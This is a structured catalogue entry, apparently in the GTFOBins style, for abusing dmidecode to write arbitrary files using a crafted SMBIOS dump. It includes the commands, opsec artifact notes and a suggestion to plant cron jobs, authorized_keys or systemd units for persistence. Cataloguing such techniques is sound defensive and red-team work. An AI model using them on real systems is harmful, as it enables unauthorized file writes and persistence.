---
name: dmidecode
capabilities:
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: low
  artifacts:
  - ~/.bash_history
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file
  notes: |-
    It can be used to write files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.
    Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.

    - `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.

    - `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.

    ```
    make dmiwrite
    echo DATA >/path/to/temp-file
    ./dmiwrite /path/to/temp-file x.dmi
    ```
references:
- https://gtfobins.github.io/gtfobins/dmidecode/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
